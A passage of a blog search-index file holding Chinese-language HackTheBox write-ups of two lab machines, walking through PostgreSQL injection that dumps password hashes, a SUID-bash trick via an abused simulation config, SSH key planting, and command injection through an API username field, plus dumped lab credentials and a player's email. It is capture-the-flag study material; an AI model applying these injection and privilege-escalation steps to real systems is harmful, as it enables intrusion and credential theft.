root","categories":[{"name":"HTB","slug":"HTB","permalink":"someb0dy.github.io/categories/HTB/"}],"tags":[{"name":"latexInject","slug":"latexInject","permalink":"someb0dy.github.io/tags/latexInject/"}]},{"title":"Jupiter","slug":"Jupiter","date":"2023-06-14T05:41:58.494Z","updated":"2023-06-14T06:12:14.518Z","comments":true,"path":"2023/06/14/Jupiter/","link":"","permalink":"someb0dy.github.io/2023/06/14/Jupiter/","excerpt":"","text":"Nmap┌──(root💀kali)-[/home/kali/hacktheboxtools] └─# nmap -A 10.10.11.216 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-05 11:21 EDT Stats: 0:00:57 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 98.94% done; ETC: 11:22 (0:00:00 remaining) Stats: 0:00:58 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 99.29% done; ETC: 11:22 (0:00:00 remaining) Stats: 0:00:59 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 99.29% done; ETC: 11:22 (0:00:00 remaining) Stats: 0:00:59 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 99.29% done; ETC: 11:22 (0:00:00 remaining) Stats: 0:00:59 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 99.29% done; ETC: 11:22 (0:00:00 remaining) Nmap scan report for 10.10.11.216 Host is up (0.22s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 ac5bbe792dc97a00ed9ae62b2d0e9b32 (ECDSA) |_ 256 6001d7db927b13f0ba20c6c900a71b41 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://jupiter.htb/ No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.93%E=4%D=6/5%OT=22%CT=1%CU=30597%PV=Y%DS=2%DC=T%G=Y%TM=647DFDB9 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=109%TI=Z%CI=Z%TS=B)SEQ(SP=10 OS:1%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M537ST11NW7%O2=M537ST11NW7%O3 OS:=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST11NW7%O6=M537ST11)WIN(W1=FE88%W2=F OS:E88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M537NNSNW OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O= OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W= OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 111/tcp) HOP RTT ADDRESS 1 270.35 ms 10.10.16.1 2 176.97 ms 10.10.11.216 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 65.74 seconds 常见的两个端口22 和 80端口 image.png 添加 &#x2F;etc&#x2F;hosts10.10.11.216 jupiter.htb 主域名 image.png 根域名没啥功能点，暂时看上去，vhost 碰撞看看 ┌──(root💀kali)-[/home/kali/hacktheboxtools] └─# gobuster vhost -u http://jupiter.htb --append-domain -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 100 =============================================================== Gobuster v3.3 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://jupiter.htb [+] Method: GET [+] Threads: 100 [+] Wordlist: /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt [+] User Agent: gobuster/3.3 [+] Timeout: 10s [+] Append Domain: true =============================================================== 2023/06/05 11:25:42 Starting gobuster in VHOST enumeration mode =============================================================== Found: kiosk.jupiter.htb Status: 200 [Size: 34390] Progress: 114441 / 114442 (100.00%)=============================================================== 2023/06/05 11:41:33 Finished =============================================================== kiosk.jupiter.htb有一个kiosk.jupiter.htb的域名，加入到hosts文件中 image.png 是一个grafana的应用 image.png bp看到历史记录中有这么一个包 image.png 这里能控制sql语句 image.png 这里能看到数据库的类型是PostgreSql 上hacktrick看看相关注入手法 Refer:https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql postgreSql查看数据库SELECT datname FROM pg_database; image.png postgres moon_namesdb template1 template0 ReadcredentialsSELECT usename, passwd from pg_shadow; image.png username passwd postgres Null grafana_viewer SCRAM-SHA-256$4096:K9IJE4h9f9+tr7u7AZL76w&#x3D;&#x3D;$qdrtC1sThWDZGwnPwNctrEbEwc8rFpLWYFVTeLOy3ss&#x3D;:oD4gG69X8qrSG4bXtQ62M83OkjeFDOYrypE3tUv0JOY&#x3D; RCE image.png image.png image.png 尝试反弹shell image.png image.png shell!!!! ^-^ 信息收集linpeas上linpeas 收集一下信息 image.png 跟用户有关系的信息 pspy image.png 一堆的反弹shell hhhh 同时打的人太多了 juno运行的进程 image.png 等着等着发现了uid&#x3D;1000(juno)运行了一个脚本 shadow-simulation.sh (估计是用来模拟网络用的)而且估计是定时任务 然后紧接着 删除了 &#x2F;dev&#x2F;shm&#x2F;shadow.data然后通过shadow 命令 加上&#x2F;dev&#x2F;shm&#x2F;network-simulation.yml作为参数所以我们看看配置文件 image.png network-simulation.yml general: # stop after 10 simulated seconds stop_time: 10s # old versions of cURL use a busy loop, so to avoid spinning in this busy # loop indefinitely, we add a system call latency to advance the simulated # time when running non-blocking system calls model_unblocked_syscall_latency: true network: graph: # use a built-in network graph containing # a single vertex with a bandwidth of 1 Gbit type: 1_gbit_switch hosts: # a host with the hostname &#39;server&#39; server: network_node_id: 0 processes: - path: /usr/bin/python3 args: -m http.server 80 start_time: 3s # three hosts with hostnames &#39;client1&#39;, &#39;client2&#39;, and &#39;client3&#39; client: network_node_id: 0 quantity: 3 processes: - path: /usr/bin/curl args: -s server start_time: 5s 这个配置文件看起来就像是，服务端启动一个开在 80端口web服务，然后客户端去请求这个web服务path 的参数的 位置感觉像是 执行的二进制文件的绝对路径args 自然就是参数 尝试执行chmod +s &#x2F;bin&#x2F;bash 的命令 给bash带上suid general: # stop after 10 simulated seconds stop_time: 10s # old versions of cURL use a busy loop, so to avoid spinning in this busy # loop indefinitely, we add a system call latency to advance the simulated # time when running non-blocking system calls model_unblocked_syscall_latency: true network: graph: # use a built-in network graph containing # a single vertex with a bandwidth of 1 Gbit type: 1_gbit_switch hosts: # a host with the hostname &#39;server&#39; server: network_node_id: 0 processes: - path: /usr/bin/cp args: /bin/bash /tmp/someb0dy/bash start_time: 3s # three hosts with hostnames &#39;client1&#39;, &#39;client2&#39;, and &#39;client3&#39; client: network_node_id: 0 quantity: 3 processes: - path: /usr/bin/chmod args: u+s /tmp/someb0dy/bash start_time: 5s 然后上传到靶机的&#x2F;dev&#x2F;shm&#x2F;目录下，值得说一下的是，这个目录存储的内容其实是存储在内存当中的 我先把内容上传到&#x2F;tmp&#x2F;someb0dy目录下然后再通过cp &#x2F;tmp&#x2F;someb0dy&#x2F;network-simulation.yml &#x2F;dev&#x2F;shm&#x2F; 覆盖原本的network-simulation.yml记得给&#x2F;tmp&#x2F;someb0dy附上 777的权限，不然juno用户没有权限写入到 这个文件夹 image.png 然后在&#x2F;tmp&#x2F;someb0dy下 运行.&#x2F;bash -p ,成功变成juno 权限 来到&#x2F;home&#x2F;juno查看那个脚本也可以确认 bash-5.1$ cat shadow-simulation.sh cat shadow-simulation.sh #!/bin/bash cd /dev/shm rm -rf /dev/shm/shadow.data /home/juno/.local/bin/shadow /dev/shm/*.yml cp -a /home/juno/shadow/examples/http-server/network-simulation.yml /dev/shm/ ssh 公钥写入我们还可以直接写入公钥到.ssh&#x2F;authorized_keys 里面就可以ssh登录了 ssh-key -f someb0dy 生成公私钥 cp /tmp/someb0dy/someb0dy.pub /home/juno/.ssh/authorized_keys image.png 通过私钥成功登录,发现是science 组，搜索一下文件 image.png frp代理流量看着有许多端口的，搭建一个代理看看 image.png 这里为什么要搜token信息呢，因为8888端口开了一个jupyter的服务 image.png 上面用了都不对然后直接看日志文件今天6.6,里面的可以用了 image.png 用日志里面的可以 image.png image.png image.png 一样和上一个用户一样的手法，同样写入.ssh&#x2F;authorized_keys image.png 提权jovian@jupiter:/usr/local/bin$ sudo -l Matching Defaults entries for jovian on jupiter: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User jovian may run the following commands on jupiter: (ALL) NOPASSWD: /usr/local/bin/sattrack 可以以管理员执行权限执行这个**&#x2F;usr&#x2F;local&#x2F;bin&#x2F;sattrack** image.png 我们直接运行这个东西，输出了一些提示信息把bash换成这个二进制文件 image.png 总结这个靶机总体来说难道中等，常规的收集信息手段，收集到子域名后，进一步收集信息，通过Postgresql 拿到Postgresql用户的shell，通过查看进程信息，来进一步获取juno的权限，接着通过juno所在的组，获取到jovian的权限，最后成功拿到root","categories":[{"name":"HTB","slug":"HTB","permalink":"someb0dy.github.io/categories/HTB/"}],"tags":[{"name":"PostgreSqlInject,Write-SSH-Key","slug":"PostgreSqlInject-Write-SSH-Key","permalink":"someb0dy.github.io/tags/PostgreSqlInject-Write-SSH-Key/"}]},{"title":"TwoMiilion","slug":"TwoMillion","date":"2023-06-14T04:22:31.259Z","updated":"2023-06-14T05:56:06.887Z","comments":true,"path":"2023/06/14/TwoMillion/","link":"","permalink":"someb0dy.github.io/2023/06/14/TwoMillion/","excerpt":"","text":"2023年6月13日 10:05:44 Nmap┌──(root💀kali)-[~] └─# nmap -sCV 10.10.11.221 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-12 22:03 EDT Nmap scan report for 10.10.11.221 Host is up (0.15s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA) |_ 256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519) 80/tcp open http nginx |_http-title: Did not follow redirect to http://2million.htb/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 14.41 seconds 经典两个端口22,80 image.png 修改&#x2F;etc&#x2F;hosts文件 image.png image.png 有登录，猜测有注册 访问&#x2F;regiser image.png 注册发现也失败了，需要邀请码，走投无路的感觉- - ，翻翻bp历史，看看有没有生成code相关逻辑的. inviteapi.min.js image.png 设置过滤器 image.png 这个js文件看起来像和邀请码有关系的逻辑 image.png 这段代码其实是生成了一个名叫makeInviteCode 的函数,我们在console调用一下 image.png function verifyInviteCode(code) { var formData = { &quot;code&quot;: code }; $.ajax({ type: &quot;POST&quot;, dataType: &quot;json&quot;, data: formData, url: &#39;/api/v1/invite/verify&#39;, success: function(response) { console.log(response) }, error: function(response) { console.log(response) } }) } function makeInviteCode() { $.ajax({ type: &quot;POST&quot;, dataType: &quot;json&quot;, url: &#39;/api/v1/invite/how/to/generate&#39;, success: function(response) { console.log(response) }, error: function(response) { console.log(response) } }) } 有一个路由 POST /api/v1/invite/how/to/generate HTTP/1.1 Host: 2million.htb Content-Length: 0 Accept: application/json, text/javascript, */*; q=0.01 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36 Content-Type: application/json Origin: http://2million.htb Referer: http://2million.htb/invite Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: PHPSESSID=stdisqd79m2j4qb1f3s9a6f250 Connection: close HTTP/1.1 200 OK Server: nginx Date: Tue, 13 Jun 2023 03:28:53 GMT Content-Type: application/json Connection: close Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Content-Length: 249 {&quot;0&quot;:200,&quot;success&quot;:1,&quot;data&quot;:{&quot;data&quot;:&quot;Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \\/ncv\\/i1\\/vaivgr\\/trarengr&quot;,&quot;enctype&quot;:&quot;ROT13&quot;},&quot;hint&quot;:&quot;Data is encrypted ... We should probbably check the encryption type in order to decrypt it...&quot;} image.png ROT13解密 image.png 他让我们请求&#x2F;api&#x2F;v1&#x2F;invite&#x2F;generate这个路由 image.png base64解密一下接着就进行注册以及登录的操作 登录后台登录之后我们进入到了一个类似HTB的界面 image.png 这里可以下载ovpn配置文件但是连接不上去 image.png 连接前把这个解析的域名记得加入到 &#x2F;etc&#x2F;hosts文件 image.png &#x2F;api&#x2F;v1我们获取路由列表登录过后有授权了 image.png 其中有一个路由settings&#x2F;update 更新设置 image.png 我们直接发起请求，回显发现Invalid content type , 失效的内容类型换成json试试 image.png image.png 根据回显操作，我们已经把自己修改成为了管理员权限 image.png 验证管理员权限成功 image.png 通过这个路由生成了一个带vpn权限的ovpn配置文件，前面自己使用普通用户的ovpn配置文件失败 结果这个地方生成的配置文件还是用不了，那么接下来我们该怎么做呢- - RCE我们可以思考一下这个地方生成配置文件的位置，是如何生成的呢？？？！ image.png 他读取我们的参数，然后在配置文件里面也有体现，所以会不会是利用类似下面代码的来实现的呢下面的代码只是例子，具体实现不一定是这样 &lt;?php $username = $_POST[&quot;username&quot;]; system(&quot;openvpn&quot;+$username); 所以这里可能存在命令执行 image.png 这样好像并没有执行成功 那当我们再加一个注释符号**# 呢？**在linux系统中 # 这个符号后面的内容会当作注释来解释 image.png 芜湖！！！ &lt;?php $username = $_POST[&quot;username&quot;]; system(&quot;openvpn&quot;+$username+&quot;Paramter&quot;); 所以他逻辑估计是这样的结构 ，后面存在别的参数 # 把后面的参数注释后就成功了同理我们也可以直接在id后面再加上一个; 也可以执行代码成功 image.png 反弹shell image.png 数据库配置文件 image.png username password admin SuperDuperPass123 www-data@2million:~/html$ which python3 which python3 /usr/bin/python3 www-data@2million:~/html$ python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; www-data@2million:~/html$ mysql -u admin -p mysql -u admin -p Enter password: SuperDuperPass123 Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 334231 Server version: 10.6.12-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04 Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type &#39;help;&#39; or &#39;\\h&#39; for help. Type &#39;\\c&#39; to clear the current input statement. MariaDB [(none)]&gt; show databases; show databases; +--------------------+ | Database | +--------------------+ | htb_prod | | information_schema | +--------------------+ 2 rows in set (0.001 sec) MariaDB [(none)]&gt; 通过python3获取一个交互式更强的shell，连接mysql数据库 MariaDB [(none)]&gt; use htb_prod; use htb_prod; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed MariaDB [htb_prod]&gt; show tables; show tables; +--------------------+ | Tables_in_htb_prod | +--------------------+ | invite_codes | | users | +--------------------+ 2 rows in set (0.000 sec) MariaDB [htb_prod]&gt; select * from users; select * from users; +----+--------------+----------------------------+--------------------------------------------------------------+----------+ | id | username | email | password | is_admin | +----+--------------+----------------------------+--------------------------------------------------------------+----------+ | 11 | TRX | trx@hackthebox.eu | $2y$10$TG6oZ3ow5UZhLlw7MDME5um7j/7Cw1o6BhY8RhHMnrr2ObU3loEMq | 1 | | 12 | TheCyberGeek | thecybergeek@hackthebox.eu | $2y$10$wATidKUukcOeJRaBpYtOyekSpwkKghaNYr5pjsomZUKAd0wbzw4QK | 1 | | 13 | admin1 | admin@test.org | $2y$10$qVCYOU26KpbHwZdKYQo2YOkthu2Lik9N7vrqZ4/NQoSPjObR0N20S | 1 | | 14 | shade1 | shade1@shade.com | $2y$10$rnJHveB0D9q6fJBtZLJ8/uy/uMI.qEicO6Lu5.k.I1talOCyPvywO | 1 | | 15 | razorrob123 | shopovrobert@gmail.com | $2y$10$KGOX6WLIrGJi9tgozKDLTeoG3v0EDGew4e0FBIJoDpqlKPwRM//Pq | 0 | | 16 | someb0dy | someb0dy@htb.com | $2y$10$SJPLEKKcBzP/G8dCxl0ADew14SzyKqSYw7/oloqYft8DTip//9BS6 | 1 | +----+--------------+----------------------------+--------------------------------------------------------------+----------+ 6 rows in set (0.000 sec) MariaDB [htb_prod]&gt; 这些数据估计是其他玩家插入的数据 查看带sh权限的用户 www-data@2million:~/html$ cat /etc/passwd | grep sh cat /etc/passwd | grep sh root:x:0:0:root:/root:/bin/bash www-data:x:33:33:www-data:/var/www:/bin/bash sshd:x:106:65534::/run/sshd:/usr/sbin/nologin fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin admin:x:1000:1000::/home/admin:/bin/bash 发现admin就是带sh的，直接用数据库的配置文件ssh登录尝试 image.png Rootadmin@2million:/var/mail$ cat admin From: ch4p &lt;ch4p@2million.htb&gt; To: admin &lt;admin@2million.htb&gt; Cc: g0blin &lt;g0blin@2million.htb&gt; Subject: Urgent: Patch System OS Date: Tue, 1 June 2023 10:45:22 -0700 Message-ID: &lt;9876543210@2million.htb&gt; X-Mailer: ThunderMail Pro 5.2 Hey admin, I&#39;m know you&#39;re working as fast as you can to do the DB migration. While we&#39;re partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can&#39;t get popped by that. HTB Godfather admin@2million:/var/mail$ 这里有一封邮件,说有一个CVE CVE-2023-3086Refer:https://github.com/xkaneiki/CVE-2023-0386 image.png image.png image.png 这里还有一封类似感谢信的东西 {&quot;encryption&quot;: &quot;xor&quot;, &quot;encrpytion_key&quot;: &quot;HackTheBox&quot;, &quot;encoding&quot;: &quot;base64&quot;, &quot;data&quot;: &quot;DAQCGXQgBCEELCAEIQQsSCYtAhU9DwofLURvSDgdaAARDnQcDTAGFCQEB0sgB0UjARYnFA0IMUgEYgIXJQQNHzsdFmICESQEEB87BgBiBhZoDhYZdAIKNx0WLRhDHzsPADYHHTpPQzw9HA1iBhUlBA0YMUgPLRZYKQ8HSzMaBDYGDD0FBkd0HwBiDB0kBAEZNRwAYhsQLUECCDwBADQKFS0PF0s7DkUwChkrCQoFM0hXYgIRJA0KBDpIFycCGToKAgk4DUU3HB06EkJLAAAMMU8RJgIRDjABBy4KWC4EAh90Hwo3AxxoDwwfdAAENApYKgQGBXQYCjEcESoNBksjAREqAA08QQYKNwBFIwEcaAQVDiYRRS0BHWgOBUstBxBsZXIOEwwGdBwNJ08OLRMaSzYNAisBFiEPBEd0IAQhBCwgBCEELEgNIxxYKgQGBXQKECsDDGgUEwQ6SBEqClgqBA8CMQ5FNgcZPEEIBTsfCScLHy1BEAM1GgwsCFRoAgwHOAkHLR0ZPAgMBXhIBCwLWCAADQ8nRQosTx0wEQYZPQ0LIQpYKRMGSzIdCyYOFS0PFwo4SBEtTwgtExAEOgkJYg4WLEETGTsOADEcEScPAgd0DxctGAwgT0M/Ow8ANgcdOk1DHDFIDSMZHWgHDBggDRcnC1gpD0MOOh4MMAAWJQQNH3QfDScdHWgIDQU7HgQ2BhcmQRcDJgETJxxYKQ8HSycDDC4DC2gAEQ50AAosChxmQSYKNwBFIQcZJA0GBTMNRSEAFTgNBh8xDEliChkrCUMGNQsNKwEdaAIMBSUdADAKHGRBAgUwSAA0CgoxQRAAPQQJYgMdKRMNDjBIDSMcWCsODR8mAQc3Gx0sQRcEdBwNJ08bJw0PDjccDDQKWCEPFw44BAwlChYrBEMfPAkRYgkNLQ0QSyAADDFPDiEDEQo6HEUhABUlFA0CIBFLSGUsJ0EGCjcARSMBHGgEFQ4mEUUvChUqBBFLOw5FNgcdaCkCCD88DSctFzBBAAQ5BRAsBgwxTUMfPAkLKU8BJxRDDTsaRSAKESYGQwp0GAQwG1gnB0MfPAEWYgYWKxMGDz0KCSdPEicUEQUxEUtiNhc9E0MIOwYRMAYaPRUKBDobRSoODi1BEAM1GAAmTwwgBEMdMRocYgkZKhMKCHQHA2IADTpBEwc1HAMtHRVoAA0PdAELMR8ROgQHSyEbRTYAWCsODR89BhAjAxQxQQoFOgcTIxsdaAAND3QNEy0DDi1PQzwxSAQwClghDA4OOhsALhZYOBMMHjBICiRPDyAAF0sjDUUqDg4tQQIINwcIMgMROwkGD3QcCiUKDCAEEUd0CQsmTw8tQQYKMw0XLhZYKQ8XAjcBFSMbHWgVCw50Cwo3AQwkBBAYdAUMLgoLPA4NDidIHCcbWDwOQwg7BQBsZXIABBEOcxtFNgBYPAkGSzoNHTZPGyAAEx8xGkliGBAtEwZLIw1FNQYUJEEABDocDCwaHWgVDEskHRYqTwwgBEMJOx0LJg4KIQQQSzsORSEWGi0TEA43HRcrGwFkQQoFJxgMMApYPAkGSzoNHTZPHy0PBhk1HAwtAVgnB0MOIAAMIQ4UaAkCCD8NFzFDWCkPB0s3GgAjGx1oAEMcOxoJJk8PIAQRDnQDCy0YFC0FBA50ARZiDhsrBBAYPQoJJ08MJ0ECBzhGb0g4ETwJQw8xDRUnHAxoBhEKIAERNwsdZGtpPzwNRQoOGyM1Cw4WBx1iOx0pDA==&quot; image.png 感谢信Dear HackTheBox Community, We are thrilled to announce a momentous milestone in our journey together. With immense joy and gratitude, we celebrate the achievement of reaching 2 million remarkable users! This incredible feat would not have been possible without each and every one of you. From the very beginning, HackTheBox has been built upon the belief that knowledge sharing, collaboration, and hands-on experience are fundamental to personal and professional growth. Together, we have fostered an environment where innovation thrives and skills are honed. Each challenge completed, each machine conquered, and every skill learned has contributed to the collective intelligence that fuels this vibrant community. To each and every member of the HackTheBox community, thank you for being a part of this incredible journey. Your contributions have shaped the very fabric of our platform and inspired us to continually innovate and evolve. We are immensely proud of what we have accomplished together, and we eagerly anticipate the countless milestones yet to come. Here&#39;s to the next chapter, where we will continue to push the boundaries of cybersecurity, inspire the next generation of ethical hackers, and create a world where knowledge is accessible to all. With deepest gratitude, The HackTheBox Team","categories":[{"name":"HTB","slug":"HTB","permalink":"someb0dy.github.io/categories/HTB/"}],"tags":[{"name":"JavaScript,RCE,CVE-2023-3086","slug":"JavaScript-RCE-CVE-2023-3086","permalink":"someb0dy.github.io/tags/JavaScript-RCE-CVE-2023-3086/"}]}],"categories":[{"name":"HTB","slug":"HTB","permalink":"someb0dy.github.io/categories/HTB/"}],"tags":[{"name":"NFS,.Xauthority","slug":"NFS-Xauthority","permalink":"someb0dy.github.io/tags/NFS-Xauthority/"},{"name":"Redis,NginxMisconfigure","slug":"Redis-NginxMisconfigure","permalink":"someb0dy.github.io/tags/Redis-NginxMisconfigure/"},{"name":"gpg,ssti","slug":"gpg-ssti","permalink":"someb0dy.github.io/tags/gpg-ssti/"},{"name":"CVE-2022-44628,CVE-2022-4510","slug":"CVE-2022-44628-CVE-2022-4510","permalink":"someb0dy.github.io/tags/CVE-2022-44628-CVE-2022-4510/"},{"name":"latexInject","slug":"latexInject","permalink":"someb0dy.github.io/tags/latexInject/"},{"name":"PostgreSqlInject,Write-SSH-Key","slug":"PostgreSqlInject-Write-SSH-Key","permalink":"someb0dy.github.io/tags/PostgreSqlInject-Write-SSH-Key/"},{"name":"JavaScript,RCE,CVE-2023-3086","slug":"JavaScript-RCE-CVE-2023-3086","permalink":"someb0dy.github.io/tags/JavaScript-RCE-CVE-2023-3086/"}]}